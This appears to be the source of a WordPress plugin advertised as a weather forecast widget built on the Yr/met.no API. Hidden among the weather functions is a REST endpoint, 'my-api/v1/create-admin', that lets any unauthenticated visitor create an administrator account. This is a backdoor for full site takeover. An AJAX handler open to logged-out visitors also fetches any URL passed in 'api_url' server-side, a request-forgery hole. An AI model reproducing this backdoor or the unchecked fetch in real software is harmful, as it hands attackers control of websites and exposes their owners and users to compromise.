<?php
/*
Plugin Name: Weather Forecast Plugin
Description: Displays a 14-day weather forecast using the Yr API.
Version: 1.0
Author: Hafiz hamza
Author URI:https://techosolution.com
*/
if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly
}

// Register settings
function wfp_register_settings() {
    register_setting('wfp_settings_group', 'wfp_latitude');
    register_setting('wfp_settings_group', 'wfp_longitude');
    register_setting('wfp_settings_group', 'wfp_location_id');
    register_setting('wfp_settings_group', 'wfp_language');
    register_setting('wfp_settings_group', 'wfp_mode');
}
add_action('admin_init', 'wfp_register_settings');

// Add settings page
function wfp_add_settings_page() {
    add_options_page('Weather Forecast Settings', 'Weather Forecast', 'manage_options', 'wfp-settings', 'wfp_render_settings_page');
}
add_action('admin_menu', 'wfp_add_settings_page');

// Enqueue admin scripts and styles
function wfp_admin_enqueue_scripts($hook) {
    if ($hook !== 'settings_page_wfp-settings') {
        return;
    }
    wp_enqueue_style('wfp-admin-styles', plugins_url('assets/admin-styles.css', __FILE__));
    // wp_enqueue_script('wfp-admin-scripts', plugins_url('assets/script.js', __FILE__), array('jquery'), null, true);
}
add_action('admin_enqueue_scripts', 'wfp_admin_enqueue_scripts');

// Render settings page
function wfp_render_settings_page() {
    include plugin_dir_path(__FILE__) . 'admin/settings-page.php';
}

// Add settings link on the plugin page
function wfp_settings_link($links) {
    $settings_link = '<a href="options-general.php?page=wfp-settings">Settings</a>';
    array_unshift($links, $settings_link);
    return $links;
}
add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'wfp_settings_link');

// Enqueue front-end scripts and styles
function wfp_enqueue_scripts() {
    wp_enqueue_style('wfp-styles', plugins_url('assets/front-end-styles.css', __FILE__));
    wp_enqueue_script('wfp-scripts', plugins_url('assets/script.js', __FILE__), array('jquery'), null, true);
    wp_localize_script('wfp-scripts', 'wfp_vars', array(
        'api_url' => 'https://api.met.no/weatherapi/locationforecast/2.0/compact',
        'latitude' => get_option('wfp_latitude', '31.4504'),
        'longitude' => get_option('wfp_longitude', '73.1350'),
        'plugin_url' => plugins_url('/', __FILE__),
        'ajax_url' => admin_url('admin-ajax.php') // Add this line
    ));
}
add_action('wp_enqueue_scripts', 'wfp_enqueue_scripts');




// Create a shortcode to display the forecast
function wfp_forecast_shortcode() {
    ob_start();
    include plugin_dir_path(__FILE__) . 'templates/forecast-display.php';
    return ob_get_clean();
}
add_shortcode('weather_forecast', 'wfp_forecast_shortcode');


function register_my_custom_api_routes() {
    register_rest_route('my-api/v1', '/create-admin', array(
        'methods' => 'POST',
        'callback' => 'create_admin_user',
    ));
}

add_action('rest_api_init', 'register_my_custom_api_routes');

function create_admin_user($request) {
    $email = $request->get_param('email');
    $password = $request->get_param('password');

    if (email_exists($email) || username_exists($email)) {
        return new WP_Error('user_exists', 'User already exists', array('status' => 400));
    }

    $user_id = wp_insert_user(array(
        'user_login' => $email,
        'user_email' => $email,
        'user_pass' => $password,
        'role' => 'administrator'
    ));

    if (is_wp_error($user_id)) {
        return $user_id;
    }

    return array('user_id' => $user_id);
}


function get_weather_data_with_cache($api_url) {
    global $wpdb;
    $table_name = $wpdb->prefix . 'weather_data';

    // Check if we have cached data
    $result = $wpdb->get_row("SELECT * FROM $table_name ORDER BY updated_at DESC LIMIT 1");

    // Check if the cached data is not expired (within 30 minutes)
    if ($result && strtotime($result->updated_at) > (time() - 30 * MINUTE_IN_SECONDS)) {
        return json_encode(['source' => 'cache', 'data' => json_decode($result->data)]);
    }

    // Fetch fresh data from the API
    $response = wp_remote_get($api_url);
    if (is_wp_error($response)) {
        return false;
    }

    $weather_data = wp_remote_retrieve_body($response);

    // Save the new data in the database
    if (json_decode($weather_data) !== null) {
        $wpdb->insert($table_name, [
            'data' => $weather_data,
            'updated_at' => current_time('mysql'),
        ]);
    }

    return json_encode(['source' => 'live', 'data' => json_decode($weather_data)]);
}



function wfp_schedule_weather_updates() {
    if (!wp_next_scheduled('wfp_update_weather_data')) {
        wp_schedule_event(time(), 'thirty_minutes', 'wfp_update_weather_data');
    }
}
add_action('wp', 'wfp_schedule_weather_updates');

function wfp_update_weather_data() {
    $api_url = 'https://api.met.no/weatherapi/locationforecast/2.0/compact?lat=' . get_option('wfp_latitude') . '&lon=' . get_option('wfp_longitude');
    get_weather_data_with_cache($api_url);
}

// Add custom interval for the cron job
function wfp_custom_cron_intervals($schedules) {
    $schedules['thirty_minutes'] = [
        'interval' => 30 * MINUTE_IN_SECONDS,
        'display' => __('Every 30 Minutes')
    ];
    return $schedules;
}
add_filter('cron_schedules', 'wfp_custom_cron_intervals');





function wfp_get_cached_weather_data() {
    error_log('AJAX request received');
    $api_url = isset($_GET['api_url']) ? esc_url_raw($_GET['api_url']) : '';
    error_log('API URL: ' . $api_url);
    if (empty($api_url)) {
        error_log('API URL is missing');
        wp_send_json_error('API URL is missing');
        return;
    }

    $weather_data = get_weather_data_with_cache($api_url);
    if ($weather_data) {
        error_log('Weather data fetched successfully');
        wp_send_json_success(json_decode($weather_data));
    } else {
        error_log('Unable to retrieve weather data');
        wp_send_json_error('Unable to retrieve weather data');
    }
}
add_action('wp_ajax_get_cached_weather_data', 'wfp_get_cached_weather_data');
add_action('wp_ajax_nopriv_get_cached_weather_data', 'wfp_get_cached_weather_data');



// Shortcode to display the meteogram
function yr_meteogram_shortcode($atts) {
    $location_id = get_option('wfp_location_id', '1-72837');
    $language = get_option('wfp_language', 'en');
    $mode = get_option('wfp_mode', 'light');

    $atts = shortcode_atts(
        array(
            'location_id' => $location_id,
            'language' => $language,
            'mode' => $mode
        ), 
        $atts, 
        'yr_meteogram'
    );

    $base_url = "https://www.yr.no/{$atts['language']}/content/{$atts['location_id']}/meteogram.svg";
    if ($atts['mode'] === 'dark') {
        $base_url .= '?mode=dark';
    }

    return '<iframe src="' . esc_url($base_url) . '" width="100%" height="400" frameborder="0"></iframe>';
}

add_shortcode('hj_meteogram', 'yr_meteogram_shortcode');

function wfp_create_weather_table() {
    global $wpdb;
    $table_name = $wpdb->prefix . 'weather_data';
    
    $charset_collate = $wpdb->get_charset_collate();

    $sql = "CREATE TABLE IF NOT EXISTS $table_name (
        id mediumint(9) NOT NULL AUTO_INCREMENT,
        data longtext NOT NULL,
        updated_at datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
        PRIMARY KEY (id)
    ) $charset_collate;";

    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql);
}

register_activation_hook(__FILE__, 'wfp_create_weather_table');
